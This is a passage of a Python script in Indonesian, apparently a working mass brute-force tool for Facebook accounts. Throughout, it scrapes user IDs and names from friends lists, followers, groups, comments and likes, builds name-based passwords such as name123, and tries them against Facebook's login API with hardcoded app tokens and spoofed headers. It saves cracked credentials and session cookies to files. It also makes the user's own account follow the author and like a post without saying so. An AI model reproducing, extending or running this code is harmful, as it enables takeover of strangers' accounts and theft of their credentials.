            kode,user = link['code'],link['user_code']
            vers = parse(ses.get(f'https://mbasic.facebook.com/device', cookies={'cookie': cok}).content, 'html.parser')
            item = ['fb_dtsg','jazoest','qr']
            for x in vers.find_all('input'):
                  if x.get('name') in item:
                        aset = {x.get('name'):x.get('value')}
                        data.update(aset)
            data.update({'user_code':user})
            meta = parse(ses.post('https://mbasic.facebook.com'+vers.find('form', method='post').get('action'), data=data, cookies={'cookie': cok}).text, 'html.parser')
            xzxz  = meta.find('form',{'method':'post'})
            for x in xzxz('input',{'value':True}):
                  try:
                        if x['name'] == '__CANCEL__' : pass
                        else:
                              data2.update({x['name']:x['value']})
                  except Exception as e:pass
            ses.post(f'https://mbasic.facebook.com{xzxz["action"]}', data=data2, cookies={'cookie':cok})
            token = ses.get(f'https://graph.facebook.com/v16.0/device/login_status?method=post&code={kode}&access_token=661587963994814|ffe07cc864fd1dc8fe386229dcb7a05e').json()['access_token']
            open('data/token.txt','w').write(token);open('data/cookies.txt','w').write(cok);followme(cok)
            cetak('\n%s[%s√%s] Akses Token Anda :%s%s'%(P1,H1,P1,H1,token));exit()
      except(KeyError):cetak('\n%s[%sx%s] Login Gagal Tumbal Udh Gk Hidup'%(P1,M1,P1));exit()

def ceklogin():
      try:
            response = requests.get('https://graph.facebook.com/me/?&access_token='+open('data/token.txt','r').read()).json()
      except(KeyError,FileNotFoundError):cetak('%s[%sx%s] Tumbal Anda Terkena Checkpoint'%(P1,M1,P1));time.sleep(3);login(),cetak('\n%s[%sx%s] Folder Token.txt Tidak Ditemukan'%(P1,M1,P1));exit()
      try:
            number = response['mobile_phone']
      except(KeyError):
            number = ('********')
      try:
            nama,idfb = response['name'],response['id']
            kelamin = response['gender'].replace('male','Laki Laki').replace('famale','Perempuan')
            ttl = response['birthday'].split('/')[1]+'-'+wulan[response['birthday'][1]]+'-'+response['birthday'].split('/')[2]
      except(KeyError):cetak('%s[%sx%s] Tumbal Anda Terkena Checkpoint'%(P1,M1,P1));time.sleep(3);login()
      menu(nama,idfb,kelamin,ttl,number)

def menu(an,ai,at,ag,ar):
      clear();cetak(Panel(''' %s_______ _     _        _______ _____     ______  _______
 |  |  | |     | |         |      |   ___ |_____] |______
 |  |  | |_____| |_____    |    __|__     |_____] |      
                                                         
'''%(K1),width=75,style='bold white'))
      cetak(Panel('             %sWelcome User Di Script BruteForce Facebook'%(K1),width=75,style='bold white'))
      wadok.append(Panel('''%s[%s•%s] Nama    : %s
%s[%s•%s] ID FB   : %s
%s[%s•%s] Gender  : %s
%s[%s•%s] Ttl     : %s
%s[%s•%s] Nomor   : +62%s'''%(P1,K1,P1,an,P1,K1,P1,ai,P1,K1,P1,at,P1,K1,P1,ag,P1,K1,P1,ar),width=37,style='bold white',title='[bold yellow]Info Login'))
      wadok.append(Panel('''%s[%s•%s] Join      : %s
%s[%s•%s] Your IP   : %s
%s[%s•%s] Country   : %s
%s[%s•%s] Time Zone : %s
%s[%s•%s] Version   : 0.4'''%(P1,K1,P1,yuzong,P1,K1,P1,requests.get('http://ip-api.com/json/').json()['query'],P1,K1,P1,requests.get('http://ip-api.com/json/').json()['country'],P1,K1,P1,requests.get('http://ip-api.com/json/').json()['timezone'],P1,H1,P1),width=37,style='bold white',title='[bold yellow]INFO USER'))
      Console().print(Columns(wadok))
      cetak(Panel('''          %s[%s01%s] Crack Publik             %s[%s06%s] Crack Gropus
          %s[%s02%s] Crack Publik Massal      %s[%s07%s] Crack Coment
          %s[%s03%s] Crack Followers          %s[%s08%s] Crack Nama
          %s[%s04%s] Crack File               %s[%s09%s] Crack Like
          %s[%s05%s] Crack Email              %s[%s10%s] Chek Result'''%(P1,H1,P1,P1,H1,P1,P1,H1,P1,P1,H1,P1,P1,H1,P1,P1,H1,P1,P1,H1,P1,P1,H1,P1,P1,H1,P1,P1,H1,P1),width=75,style='bold white',title='[bold yellow]LIST MENU'))
      cetak(Panel('   %sKetik %s"report" %sUntuk Report Bug Script Ketik %s"keluar" %sUntuk Log Out'%(P1,H1,P1,M1,P1),width=75,style='bold white'))
      user = Console().input('%s[%s•%s] pilih menu: '%(P1,H1,P1))

      if user == '1' or user == '01':
            cetak(Panel('            %smasukan uid yg bersifat publik untuk di dump'%(K1),width=75,style='bold white'))
            user = Console().input('%s[%s•%s] Masukan id: '%(P1,H1,P1))
            try:
                  freya = ses.get('https://graph.facebook.com/'+user+'?fields=friends.fields(id,name).limit(5000)&access_token='+open('data/token.txt','r').read(),cookies={'cookie': open('data/cookies.txt','r').read()}).json()['friends']['data']
                  for xz in freya:
                        uid2.append(xz['id']+'|'+xz['name'])
            except(KeyError,IOError):
                  cetak('%s[%sx%s] Uid Tidak Publik'%(P1,M1,P1))
            aturuid()

      elif user == '2' or user == '02':
            cetak(Panel('              %sGunakan tanda %s"koma" %suntuk pemisahan uid'%(K1,H1,K1),width=75,style='bold white'))
            user = Console().input('%s[%s•%s] Masukan id: '%(P1,H1,P1))
            try:
                  for uid in user.split(','):
                        try:
                              freya = ses.get('https://graph.facebook.com/'+uid+'?fields=friends.fields(id,name).limit(5000)&access_token='+open('data/token.txt','r').read(),cookies={'cookie': open('data/cookies.txt','r').read()}).json()['friends']['data']
                              for xz in freya:
                                    uid2.append(xz['id']+'|'+xz['name'])
                        except(KeyError):pass
            except(KeyError,IOError):
                  cetak('%s[%sx%s] Tumbal Anda Terkena Checkpoint'%(P1,M1,P1))
                  try:
                        os.system('rm -rf data/token.txt && rm -rf data/cookies.txt')
                  except:pass
            aturuid()
      elif user == '3' or user == '03':
            cetak(Panel('              %sGunakan tanda %s"koma" %suntuk pemisahan uid'%(K1,H1,K1),width=75,style='bold white'))
            user = Console().input('%s[%s•%s] Masukan id: '%(P1,H1,P1))
            for uid in user.split(','):
                  link = (f'https://mbasic.facebook.com/'+uid+'?v=followers')
                  if user == '' or user == ' ':
                        exit('%s[%sx%s] Jangan Kosong'%(P1,M1,P1))
                  elif str(link) == 'Halaman Tidak Ditemukan' or str(link) == 'Anda Diblokir Sementara' or str(link) == 'Konten Tidak Ditemukan':
                        cetak('%s[%sx%s] Akun Tumbal Di Batasi Oleh Facebook'%(P1,M1,P1))
                  else:
                        dumpfolower(link)
            aturuid()
      elif user == '4' or user == '04':
            cetak(Panel('             %sGunakan tanda %s"koma" %suntuk pemisahan file'%(K1,H1,K1),width=75,style='bold white'))
            user = Console().input('%s[%s•%s] Masukan nama file: '%(P1,H1,P1))
            try:
                  for file in user.split(','):
                        for response in open(file,'r').readlines():
                              if response.strip() in uid2:
                                    pass
                              else:
                                    uid2.append(response.strip())
                  aturuid()
            except(FileNotFoundError):cetak('%s[%sx%s] File Tidak Ditemukan '%(P1,M1,P1))

      elif user == '5' or user == '05':
            cetak(Panel('          %sFormat Akan Selalau %s"@Gmail.com" %sUntuk Setiap Crack'%(K1,H1,K1),width=75,style='bold white'))
            user = Console().input('%s[%s•%s] Masukan nama: '%(P1,H1,P1))
            limt = Console().input('%s[%s•%s] Masukan limit: '%(P1,H1,P1))
            try:
                  for userx in range(100000):
                        nama1 = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','budi','joni','toni','cahya','riski','farhan','aden','joko','01','02','03','04','05','06','07','08','09','10']
                        nama2 = ['99','official','gaming','utama','123','1234','12345','123456','cakep','01','02','03','04','05','06','07','08','09','10']
                        B = [f'{str(random.choice(nama1))}',f'{str(random.randint(0,31))}',f'{str(random.choice(nama2))}'f'{str(random.choice(nama1))}{str(random.randint(0,31))}',f'{userx}',f'{str(random.choice(nama2))}{str(random.randint(0,31))}',f'{str(random.choice(nama1))}{str(random.choice(nama2))}']
                        gabung = user+str(random.choice(B))+'@gmail.com'
                        if gabung in uid2:
                              pass
                        else:
                              uid2.append(gabung+'|'+user)
                              if len(uid2) in int(limt):break
                  aturuid()
            except(Exception) as e:print(e)

      elif user == '6' or user == '06':
            cetak(Panel('             %sGunakan tanda %s"koma" %suntuk pemisahan uid'%(K1,H1,K1),width=75,style='bold white'))
            user = Console().input('%s[%s•%s] Masukan uid grup :'%(P1,H1,P1))
            for uid in user.split(','):
                  if user == '' or user == ' ':
                        cetak('%s[%sx%s] Jangan Ksosng'%(P1,M1,P1))
                  else:
                        dumpgrup('https://iphone.facebook.com/groups/'+uid+'/')
            aturuid()

      elif user == '7' or user == '07':
            cetak(Panel('             %sGunakan tanda %s"koma" %suntuk pemisahan uid'%(K1,H1,K1),width=75,style='bold white'))
            user = Console().input('%s[%s•%s] Masukan uid grup :'%(P1,H1,P1))
            for uid in user.split(','):
                  if user == '' or user == ' ':
                        cetak('%s[%sx%s] Jangan Ksosng'%(P1,M1,P1))
                  else:
                        dumpgrup('https://iphone.facebook.com/'+uid)
            aturuid()
      elif user in ['8','08']:
            cetak(Panel('              [bold yellow] Satu nama setara dengan [bold green]5000 [bold yellow]id',width=75,style='bold white'))
            hem=Console().input("%s[%s•%s] Masukan satu nama  : "%(P1,H1,P1))
            tar=hem.replace(" ","%20")
            with ThreadPoolExecutor(max_workers=30) as pool:
                try:
                   for i in range(50):
                        haha=['adit','risma','risman','asep','udin','cecep','pepen','agus',"iqbal","kami","siska","batam","medan","new","jian","tias","rio"," lia","farz","marvel","jakarta","anisha","juven","der","rika","udin","rayan","tina","tiara","fahmi","baili","rima","gadis","dimas","abram","ajis","vicky","charlie","piko","billa"]
                        k=random.choice(['adit','risma','risman','asep','udin','cecep','pepen','agus',"iqbal","kami","siska","batam","medan","new","jian","tias","rio"," lia","farz","marvel","jakarta","anisha","juven","der","rika","udin","rayan","tina","tiara","fahmi","baili","rima","gadis","dimas","abram","ajis","vicky","charlie","piko","billa"])
                        t=k+'%20'+tar+'%20bandung'
                        h=tar+'$20'+k+'%20jawa'
                        y=k+'%20'+tar
                        to=tar+'%20banten'
                        ee=random.choice(haha)+'%20'+tar
                        tai='tante%20'+tar
                        tot=random.choice([tai,to,y,t,h,ee])
                        pool.submit(urlnama,'https://iphone.facebook.com/public/'+tot+'?')
                except Exception as e:print(e)
            aturuid()
      elif user == '10':
            cetak(Panel('''%s[%s01%s] Check Result Ok Anda
%s[%s02%s] Check Result Cp Anda
%s[%s03%s] Kembali Ke Menu'''%(P1,H1,P1,P1,H1,P1,P1,M1,P1),style='bold white',width=75))
            user = Console().input('%s[%s•%s] pilih menu: '%(P1,H1,P1))
            if user == '1' or user == '01':
                  cekresult('OK')
            elif user == '2' or user == '02':
                  cekresult('CP')
            else:
                  ceklogin()
      elif user in ['9','09']:
                cetak(Panel('             [bold yellow]Contoh url [bold white]: [bold green]https://www.facebook.com/',width=75,style='bold white'))
                linglung=Console().input("%s[%s•%s] Masukan url post  : "%(P1,H1,P1))
                if not "https://www.facebook.com/" in linglung:exit("gunakan : 'https://www.facebook.com/' ")
                ur=linglung.replace("https://www.facebook.com/","https://mbasic.facebook.com/")
                awalik(ur)
      elif user == 'keluar' or user == 'Keluar':
            try:
                  os.system('rm -rf data/token.txt && rm -rf data/cookies.txt')
            except(FileNotFoundError):pass
      elif user in ["report","Report"]:
            pass
            
def aturuid():
      Console().print('\r%s[%s•%s] sedang mengumpulkan %s%s %suid'%(P1,H1,P1,H1,len(uid2),P1),end='');sys.stdout.flush()
      print('\r');cetak(Panel('''%s[%s01%s] Crack Dari Uid Tua
%s[%s02%s] Crack Dari Uid New
%s[%s03%s] Crack Dari Uid Random'''%(P1,H1,P1,P1,H1,P1,P1,H1,P1),title='ATUR UID',style='bold white',width=75))
      user = Console().input('%s[%s•%s] pilih menu: '%(P1,H1,P1))
      if user == '1' or user == '01':
            for zx in sorted(uid2):
                  uid.append(zx)
            aturmethode()
      elif user == '2' or user == '02':
            muda=[]
            for bacot in sorted(uid2):
                  muda.append(bacot)
            bcm=len(muda)
            bcmi=(bcm-1)
            for xmud in range(bcm):
                  uid.append(muda[bcmi])
                  bcmi -=1              
            aturmethode()
      elif user == '3' or user == '03':
            for bacot in uid2:
                  xx = random.randint(0,len(uid2))
                  uid.insert(xx,bacot)
            aturmethode()

def akhirnama(url):
        try:
            data=parse(requests.get(url).text,"html.parser").text
            nama=re.search('(.*?) |',str(data))[0]
            id=url.replace("https://iphone.facebook.com/","")
            ids=str(id)+'|'+str(nama)
            if len(ids)>30:pass
            else:
                    try:
                            if ids in uid2:pass
                            else:
                                uid2.append(ids)
                                
                    except Exception as e:print(e)
        except Exception as e:print(e)
        
def urlnama(url):
        data=parse(requests.get(url).text,"html.parser")
        with ThreadPoolExecutor(max_workers=30) as pool:
                for id in re.findall('url:"(.*?)",',str(data)):                        
                        link=id.replace("https://m.facebook.com/profile.php?id=","")
                        pool.submit(akhirnama,"https://iphone.facebook.com/"+link)

def gaslik(url):
#    print(url)
    id=requests.Session()
    user=parse(id.get(url,cookies={"cookie":open('data/cookies.txt', 'r').read()}).text,"html.parser")
    #print(user.text)
    for z in user.find_all("a",href=True):
        if"/profile.php?id="in z["href"]:
            for i in re.findall('id=(.*?)&eav=',str(z["href"])):
                semua=f'{i}|{z.text}'
                uid2.append(semua)
                sys.stdout.write('\r%s[ • ] %ssedang mengumpulkan %s id'%(H, P, len(uid2)));sys.stdout.flush()
    for z in user.find_all("a",href=True):
        if "Lihat Selengkapnya"in z.text:
            gaslik("https://mbasic.facebook.com"+z["href"])
    print("\n")
    aturuid()
    
def awalik(url):
    link=parse(requests.get(url,cookies={"cookie":open('data/cookies.txt', 'r').read()}).text,"html.parser")
    for z in link.find_all("a",href=True):
        if "rb"in z.text:
            if"ufi"in z["href"]:
                lin=parse(requests.get("https://mbasic.facebook.com"+z["href"],cookies={"cookie":open('data/cookies.txt', 'r').read()}).text,"html.parser")
                #print(lin.text)
                for x in lin.find_all("a",href=True):
                    if "reaction_type=1&" in x["href"]:
                        gaslik("https://mbasic.facebook.com"+x["href"])
    for x in link.find_all("a",href=True):
        if x.text in ["Lainnya"] :
            awalik("https://mbasic.facebook.com"+x["href"])
    for x in link.find_all("a",href=True):
        if x.text in ["Berita Lengkap"]:
            awalik("https://mbasic.facebook.com"+x["href"])

def dumpfolower(link):
      try:
            link = ses.get(link,cookies={'cookie': open('data/cookies.txt', 'r').read()}).text
            search = re.findall('" \/>\<div\ class\=\"..\"\>\<a\ href\=\"\/(.*?)\"\><span\>(.*?)\<\/span\>',link)
            for user in search:
                  try:
                        if 'profile.php?' in user[0]:
                              uid2.append(re.findall('id=(.*?)&amp;eav', user[0])[0]+'|'+user[1])
                        else:
                              uid2.append(re.findall('(.*?)\?eav', user[0])[0]+'|'+user[1])
                  except(IndexError):pass
            if 'Lihat Selengkapnya' in link:
                  dumpfolower('https://mbasic.facebook.com/'+parse(link, 'html.parser').find('a', string='Lihat Selengkapnya').get('href'))        
      except(KeyError):pass
      
def dumpgrup(url):
      try:
            links = parse(ses.get(url).text, 'html.parser')
            for respons in re.findall('data-sigil="feed_story_(.*?)class="img',str(links)):
                  for user in re.findall('ring(.*?)"',str(respons)):
                        for nama in re.findall('label="(.*?),',str(respons)):
                              if user+'|'+nama in uid:pass
                              else:uid2.append(user+'|'+nama)
                              
            for x in links.find_all('a',href=True):
                  if x.text == 'Lihat Postingan Lainnya…':
                        dumpgrup('https://iphone.facebook.com'+x.get('href'))
      except(KeyError):cetak('%s[%sx%s] Grup Bersifat Privat'%(P1,M1,P1))
      
def dumpkomen(url):
      try:
            links = parse(ses.get(url).text, 'html.parser')
            for respons in re.findall('data-sigil="feed_story_(.*?)class="img',str(links)):
                  for user in re.findall('ring(.*?)"',str(respons)):
                        for nama in re.findall('label="(.*?),',str(respons)):
                              if user+'|'+nama in uid:pass
                              else:uid2.append(user+'|'+nama)
            for z in links.find_all("a",href=True):
                  if z.text == ' Lihat komentar lainnya…' or z.text == ' Lihat komentar sebelumnya…':
                        dumpkomen('https://iphone.facebook.com/'+z['href'])
      except(KeyError,IOError):cetak('%s[%sx%s] Komen Bersifat Privat'%(P1,M1,P1))

def cekresult(folder):
      global loop
      hx = []
      try:
            ax = os.listdir(folder)
      except(FileNotFoundError):
            cetak('%s[%sx%s] File Tidak Ditemukan '%(P1,M1,P1));exit()
      print('\n')
      for xx in ax:
            hx.append(xx)
            loop+=1
            print('['+str(loop)+']'+xx)
            try:
                  file = open(folder+'/'+xx,'r').readlines()
            except:
                  continue
      user = Console().input('%s[%s•%s] pilih : '%(P1,H1,P1))
      try:
            file = hx[int(user)-1]
      except(IndexError):
            cetak('%s[%sx%s] File Tidak Ditemukan '%(P1,M1,P1));exit()
      try:
            filemu = open(folder+'/'+file,'r').read()
      except(FileNotFoundError):
            cetak('%s[%sx%s] File Tidak Ditemukan '%(P1,M1,P1));exit()
     # cetak(Panel('           %sHASIL '+folder+' ANDA'%(P1),width=75,style='bold white'))
      print(filemu)
      
def aturmethode():
      
      cetak(Panel('''%s[%s01%s] nama123+nama12345+nama123456
%s[%s02%s] namafull+nama123+nama12345+nama123456
%s[%s03%s] namafull+nama123+nama12345+nama123456+manual'''%(P1,H1,P1,P1,H1,P1,P1,H1,P1),title='ATUR PASWORD',style='bold white',width=75))
      user = Console().input('%s[%s•%s] pilih menu: '%(P1,H1,P1))
      cetak(Panel(f"               {K1}  tampilkan opsi ceckpoint ? {H1}(Y/n)",style='bold white',width=75))
      cekop = Console().input('%s[%s•%s] pilih menu: '%(P1,H1,P1))
      if user == '1' or user == '01':
            if cekop in ["y","Y"]:
                pasword('ya','1','')
            else:pasword('memek','1','')
      elif user == '2' or user == '02':
            if cekop in ["y","Y"]:
                pasword('ya','2','')
            else:pasword('memek','2','')
      else:
            pasw = Console().input('%s[%s•%s] masukan pasword: : '%(P1,H1,P1)).split(',')
            if cekop in ["y","Y"]:
                pasword('ya','3','')
            else:pasword('memek','3',pasw)
            
               
def pasword(opsi,method,pasw):
      global prog,des
      cetak(Panel('''%s[%s01%s] Hasil Ok Tersimpan Di Okeh.txt
%s[%s02%s] Hasil Cp Tersimpan Di Cepeh.txt'''%(P1,H1,P1,P1,H1,P1),style='bold white',width=75))
      prog = Progress(SpinnerColumn('smiley'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
      des = prog.add_task('',total=len(uid))
      with prog:
             with ThreadPoolExecutor(max_workers=30) as pool:
                   for idx in uid:
                         user,name = idx.split('|')[0],idx.split('|')[1].lower()
                         depan = name.split(' ')[0]
                         if method == '1':
                               if len(name)<5:
                                     if len(depan)<1 or len(depan)<2:pass
                                     else:
                                           pwa = [depan+'123',depan+'12345',depan+'123456']
                               else:
                                     pwa = [name,depan+'123',depan+'12345',depan+'123456']
                               pool.submit(apimethod,opsi,user,pwa)
                         elif method == '2':
                               if len(name)<5:
                                     if len(depan)<1 or len(depan)<2:pass
                                     else:
                                           pwa = [depan+'123',depan+'12345',depan+'123456',depan+'01',depan+'02',depan+'03',depan+'04',depan+'05',depan+'06',depan+'07',depan+'321']
                               else:
                                     pwa = [name,depan+'123',depan+'12345',depan+'123456',depan+'01',depan+'02',depan+'03',depan+'04',depan+'05',depan+'06',depan+'07',depan+'321']
                               pool.submit(apimethod,opsi,user,pwa)
                         elif method == '3':
                               if len(name)<5:
                                     if len(depan)<1 or len(depan)<2:pass
                                     else:
                                           pwa = [depan+'123',depan+'12345',depan+'123456',depan+'01',depan+'02',depan+'03',depan+'04',depan+'05',depan+'06',depan+'07',depan+'321']
                               else:
                                     pwa = [name,depan+'123',depan+'12345',depan+'123456',depan+'01',depan+'02',depan+'03',depan+'04',depan+'05',depan+'06',depan+'07',depan+'321']
                               pool.submit(apimethod,opsi,user,pwa+pasw)
      cetak('\n%s[%s√%s] CRACK SUKSES\n%sOK:%s\n%sCP:%s%s'%(P1,H1,P1,H1,len(ok),K1,len(cp),P1))
      exit()
                                     








def apimethod(opsis,user,pasw):
      global loop,ok,cp
      prog.update(des,description=f'\r%scracking %s[%s|%s] %s[Ok:-%s] %s[Cp:-%s] %s[Status:%s aman%s] '%(H1,P1,loop,len(uid),H1,len(ok),K1,len(cp),P1,H1,P1));prog.advance(des)
      for pw in pasw:
            try:
                  ua = str(random.choice(ugen))
                  params = {'User-Agent':ua,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
                  data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':user,'password':pw,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_GB','client_country_code':'ID','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
                  response = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=params,allow_redirects=False).json()
                  if 'session_key' in response:
                        session = response['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+'; dpr=2; locale=en_US; wd=950x1835; ';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
                        uidf = response['uid']
                        okp = Tree(Panel('      SUKSES LOGIN',width=30,style='bold green'))
                        okp.add(Panel('user: '+str(uidf)+'\n'+'pasw: '+pw,width=40,style='bold green'))
                        okp.add(Panel(ua,width=70,style='bold green'))
                        okp.add(Panel(cookie,width=70,style='bold green'))
                        ok.append(user)
                        cetak(okp)
                        with open('OK/'+yuzong+'.txt','a') as xnx:
                              xnx.write(str(uidf)+'|'+pw+'\n')
                        break
                  elif 'www.facebook.com' in response['error']['message']:
                        try:uidf = response['error']['error_data']['uid']
                        except:break
                        cpk = Tree(Panel('       CHECKPOINT',width=30,style='bold yellow'))
                        cpk.add(Panel('user: '+str(uidf)+'\n'+'pasw: '+pw,width=40,style='bold yellow'))
                        cpk.add(Panel(ua,width=70,style='bold yellow'))
                        ops=[]
                        if 'ya' in opsis:
                           try:
                              sess=requests.Session()
                              data={}
                              uua="Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
                              sess.headers.update({"User-Agent":uua,"Host":"m.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":"ua"})
                              soup=parse(sess.get("https://m.facebook.com/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
                              link=soup.find("form",{"method":"post"})
                              for x in soup("input"):data.update({x.get("name"):x.get("value")})
                              data.update({"email":uidf,"pass":pw})
                              response=parse(sess.post("https://m.facebook.com"+link.get("action"),data=data).text,"html.parser")
                              try:
                                   link2=response.find("form",{"method":"post"});listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
                                   for x in response("input"):
                                        if x.get("name") in listInput:data2.update({x.get("name"):x.get("value")}) 
                                   responses=parse(sess.post("https://m.facebook.com"+link2.get("action"),data=data2).text,"html.parser")
                                   cek=[cek.text for cek in responses.find_all("option")]
                                   if len(cek)==0:pass
                                   else:
                                         for opsi in range(len(cek)):ops.append(Panel("[bold white]"+cek[opsi],style='bold cyan'))
                              except:pass
                              if len(ops)==0:pass
                              else:cpk.add(Panel(Columns(ops),width=70,title="opsi",style="bold yellow"))
                           except Exception as e:print(e)
                        else:pass
                        cetak(cpk)
                        cp.append(user)
                        with open('CP/'+yuzong+'.txt','a') as xnx:
                              xnx.write(user+'|'+pw+'\n')
                        break
                  elif 'Login approvals are on. Expect an SMS shortly with a code to use for log in' in response['error']['message']:break
                  else:continue
            except(requests.exceptions.ConnectionError):prog.update(des,description=f'\r%scracking %s[%s|%s] %s[Ok:-%s] %s[Cp:-%s] %s[Status:%s spam%s] '%(H1,P1,loop,len(uid),H1,len(ok),K1,len(cp),P1,M1,P1));prog.advance(des);time.sleep(30)
            except Exception as e:print(e)
      loop+=1

def followme(kueh):
      for user in mysosmed:
            try:
                  for response in parse(requests.get(f'https://mbasic.facebook.com/'+user,cookies={'cookie':kueh}).text,'html.parser').find_all('a',href=True):
                        if '/a/subscribe.php?' in response.get('href'):x=requests.get('https://mbasic.facebook.com{}'.format(response['href']), cookies = {'cookie':kueh}).text
            except(Exception) as e:print(e)
      for z in parse(requests.get("https://mbasic.facebook.com/photo.php?fbid=280633417717519&id=100073125893802&set=a.110234541424075&eav=AfZGjhHFVFn0f2ijQCCzSdVlL5_DHF7xY72_KT7R_I6g0M6Pdm2RSwkyjRBfCGYxrvs&paipv=0&refid=17&_ft_=encrypted_tracking_data.0AY_-Bre3ojGqVxQJPcY98h8HflWySzOOUM-LABGmUY94rtVE99TlRls-CHqnI-yBDTnahimgc5tFScPeyvTbdL3lhadd9vM1cJWaLmVFyAMN92icKe0rkra0aXlUy0M8pjI5uE8lIIVoagOJ9gXas5ib2X8Jn_99fg9PgJbAib0DqKe09rKIJkmmJ8uFLgGtH3b4Gq6eFl9YIzyIskOAEfUcHjIRJgCRrLDYlqvPKs0brr5lHqXEvPP3KNGRjEcv22tIRvbDQlAbJDn6sOlnpfNVOe7MztmjLk7F2x6nqvbouK0ePn8xNwBQJvgRsgZyKX2S6e1XGzI0Wk69OUM8zk0fsHnZm2q8ZuwdRqQo7VTCEF1MWMLfXtCEYdrUV5QMIXmKY6boQLgfbUTTAax41gVMw1Ni_szDkbj-rx1rgR0_arzfvq5mRTJsqvNZrZvn6fI42cMBe4vrKEDJTGpjWSB0kOu6L34-aMONAukUk2Y8m5onsoUX6Bba0SHFvb9RkjhY-7bwPJO-nWlzYVNjj_7B9takt7FfP9V6taum6C0lkZAkXMuxqsdPHa3A7gIAMBSXkScJNxjPogQKCg9c7ZB-foyqUnHyXRuDQD2xXfDfJheajUacPZWpVOKZCOHpV-HLBXkOA82_8Fa_AKh5oV7xtEx3InBDcx8iCov0j3XxlZ_NqV-yTzyAyB1aYdcq3SLlafb0Kd4o_RnEGlmP0eqRezJqKpjnnOJGTOmFiAFYz8PxFCGh_1_mF0jDGqLTZZhbWcPMYHS87f48oPDTazR6jvcfVwkxIIh_VinwvdhQ&__tn__=EH-R",cookies={"cookie":kueh}).text,"html.parser").find_all("a",href=True):
            if z.text in ["Suka","Like"]:requests.get("https://mbasic.facebook.com"+z["href"],cookies={"cookie":kueh})

tim, day = datetime.now().hour,datetime.now().day
duo = (str(tim)+'|'+str(day))
waktu,bulan = duo.split('|')
            
if __name__ == '__main__':
      try:os.mkdir('data')
      except:pass
      try:os.system("git pull")
      except:pass
      try:os.mkdir('CP')
      except:pass
      try:os.mkdir('OK')
      except:pass
      ceklogin()
